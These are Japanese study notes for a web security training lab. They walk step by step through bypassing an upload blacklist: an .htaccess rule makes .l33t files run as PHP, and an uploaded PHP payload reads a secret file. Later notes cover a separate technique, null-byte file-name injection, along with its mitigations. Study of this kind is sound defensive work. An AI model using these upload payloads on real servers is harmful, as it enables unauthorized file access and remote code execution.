## Lab: Web shell upload via extension blacklist bypass
	

## 攻撃の流れ

```
.php はブラックリストで拒否される
　　↓
.htaccess をアップロードして「.l33t = PHP」と設定
　　↓
exploit.l33t をアップロード（ブラックリック回避）
　　↓
exploit.l33t が PHP として実行される
　　↓
Carlos の秘密を取得！
```

---

## STEP 1: ログイン & 画像アップロード
- `wiener:peter` でログイン
- 普通の画像をアバターとしてアップロード

## STEP 2: Repeater にリクエストを送る
- `POST /my-account/avatar` → **タブB**
- `GET /files/avatars/<画像>` → **タブA**

## STEP 3: .htaccess をアップロード（タブB）
```
filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .l33t
```

POST = サーバーにデータを送る

• アバター画像を送る
• .htaccess を送る
• exploit.l33t を送る


全部「サーバーにファイルを渡す」動作。

だから POST。

## STEP 4: exploit.l33t をアップロード（タブB）
```
filename="exploit.l33t"
Content-Type: text/plain

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

GET = サーバーからデータを取りに行く

GET /files/avatars/exploit.l33t


これは、

👉「そのファイルの中身を見せて」

という意味。

そしてサーバーは .l33t を PHP として実行する設定になってるから、
中の PHP が動いて 秘密ファイルの内容が返ってくる。

## STEP 5: PHPシェルを実行（タブA）
```
GET /files/avatars/exploit.l33t
```
→ レスポンスに秘密が表示される

## STEP 6: Submit solution で提出！

---



## STEP 1: なぜ普通の画像をアップロードしたのか？

普通の画像をアップロードしたのは、**サーバーがどこに画像を保存するか確認するため**

Burp の HTTP history を見ると：
```
GET /files/avatars/<画像ファイル名>
```

というリクエストが見つかります。これで「アップロードしたファイルは `/files/avatars/` に保存される」とわかりました。


## STEP 2: なぜ .php をアップロードしなかったのか？

本来やりたいことは：

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

これを `exploit.php` としてアップロードして実行することです。

でも試すと**サーバーに拒否される**んです。

```
.php はブラックリストに登録されている → ❌ 拒否
```

なので「**.php を使わずに PHP を実行する方法**」を考える必要がありました。


## STEP 3: .htaccess って何？

Apache サーバーには `.htaccess` という特別なファイルがあります。

これは**そのディレクトリのルールを設定できるファイル**です。

今回アップロードしたのは：

```
AddType application/x-httpd-php .l33t
```

これは Apache に対して：

```
「.l33t という拡張子のファイルは PHP として実行しろ」
```

と命令しています。

つまり `.htaccess` を `/files/avatars/` にアップロードすることで、**そのフォルダのルールを書き換えた**わけです！


## STEP 4: なぜ exploit.l33t をアップロードしたのか？

STEP 3 で `.htaccess` によって：

```
.l33t = PHP として実行する
```

というルールを設定しました。

なので今度は中身が PHP のファイルを `.l33t` という拡張子でアップロードします：

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

サーバー側の判断はこうなります：

```
exploit.l33t が来た
　　↓
.l33t はブラックリストに登録されていない → ✅ 許可
　　↓
.htaccess のルールで .l33t は PHP として実行
　　↓
Carlos の秘密を読み取って返す
```

ブラックリストは `.php` しか見ていないので `.l33t` は素通りできたわけです！


## STEP 5: なぜ GET リクエストで秘密が取得できたのか？

タブA で：

```
GET /files/avatars/exploit.l33t
```

を送信しました。

これは「このファイルを見せてくれ」というリクエストです。

普通のファイルなら**そのまま中身を返す**だけですが：

```
exploit.l33t にアクセス
　　↓
Apache が .htaccess のルールを確認
　　↓
「.l33t は PHP として実行しろ」
　　↓
<?php echo file_get_contents('/home/carlos/secret'); ?> が実行される
　　↓
/home/carlos/secret の中身が返ってくる
　　↓
m9t1GEAfVWUSatGoBxjzHXCzNgIGFpbp
```

**ファイルを「見る」つもりが「実行」されていた**というのがポイントです！









---

🔥 結論

別ファイルでも実行できる理由は、
「サーバーに置いた“全てのファイル”は、URL でアクセスできるから」。

つまり：

• .htaccess は 設定ファイル
• exploit.l33t は 攻撃コードファイル
• どっちも サーバーに置いた時点で別々のファイルとして存在する
• GET でそのファイルを指定すれば、サーバーはそのファイルを処理する


だから 別ファイルでも実行できる。

---

🟦 もっと具体的に（超シンプル）

🟥 STEP 3

.htaccess


→ サーバーに「設定ファイル」を置いた
→ まだ攻撃コードは存在しない

🟩 STEP 4

exploit.l33t


→ サーバーに「攻撃コードファイル」を置いた
→ この時点でサーバーには 2つのファイルが存在する

• /files/avatars/.htaccess
• /files/avatars/exploit.l33t


🟦 STEP 5

GET /files/avatars/exploit.l33t


→ サーバーは「exploit.l33t というファイルを開け」と言われる
→ .htaccess の設定により「.l33t は PHP として実行」と決まっている
→ だから exploit.l33t の中身（PHP）が実行される

---

🟧 混乱してたポイント

自分の頭の中ではこうなってた：

• 「.htaccess をアップロードした」
• 「でも exploit.l33t は作ってない」
• 「なのに GET で exploit.l33t が実行されるのはおかしい」


でも実際は：

🟩 STEP 4 で exploit.l33t をアップロードしてる

（ローカルに作ってないだけで、POST が“作って送ってる”）

だからサーバーには 2つのファイルが存在する。

---

🟣 つまり、別ファイルでも実行できる理由はこれだけ

サーバーに置いたファイルは全部 URL でアクセスできるから。
そして .htaccess が「.l33t は PHP」と設定してるから。

---

🟩 まとめ

• .htaccess と exploit.l33t は 別ファイル
• どっちも POST でサーバーに置いてる
• サーバーに置いた時点で URL でアクセスできる別ファイル
• .htaccess の設定により .l33t が PHP として実行される
• だから GET で exploit.l33t を実行

---

🟥 どんな脆弱性か（Null Byte インジェクションによるファイルアップロード）

■ 脆弱性の本質

サーバーがファイル名を「C言語的な文字列」として扱っており、
%00（Null Byte）で文字列が強制終了してしまうことを悪用する脆弱性。

その結果：

• バリデーション（拡張子チェック）は .jpg を見る → 通過
• 実際の保存処理は %00 で文字列が切れる → .php として保存される


つまり：

exploit.php%00.jpg


と送ると、

• チェック：.jpg → OK
• 保存：exploit.php → PHP として実行可能


という 検証と保存の不一致 が起きる。

---

🟥 なぜ危険なのか（影響）

• 攻撃者が 任意の PHP ファイルをアップロードできる
• その PHP が サーバー上で実行される
• 結果として：• 機密ファイルの読み取り
• コマンド実行
• Web シェル設置
• サーバー乗っ取り



など 完全なリモートコード実行（RCE） に繋がる。

---

🟩 どう対策するか（安全な実装）

✔ 1. Null Byte を含むファイル名を拒否する

%00（\0）が含まれていたら即拒否。

✔ 2. 拡張子チェックを “保存時のファイル名” で行う

検証と保存で 同じファイル名 を使うこと。

✔ 3. ホワイトリストで拡張子を制限

例：.jpg, .png, .gif のみ許可。

✔ 4. Content-Type を信用しない。
実際のファイルヘッダ（マジックバイト）を確認する。

✔ 5. アップロード先を “実行不可ディレクトリ” にする

Apache/Nginx の設定で：
• PHP を実行できない場所に保存する
• .php が置かれても実行されないようにする


✔ 6. ファイル名をサーバー側で強制的に再生成する

ユーザーが指定した filename を信用しない。

---

🟦 まとめ（面接・レポート用の最短版）

脆弱性：
サーバーが Null Byte（%00）を文字列終端として扱うため、
exploit.php%00.jpg のような名前が
「検証では .jpg」「保存では .php」と解釈され、
任意の PHP ファイルをアップロードできてしまう。

対策：

• Null Byte を含むファイル名を拒否
• 検証と保存で同じファイル名を使用
• 拡張子ホワイトリスト
• MIME タイプをサーバー側で再判定
• 実行不可ディレクトリに保存
• ファイル名をサーバー側で再生成


---



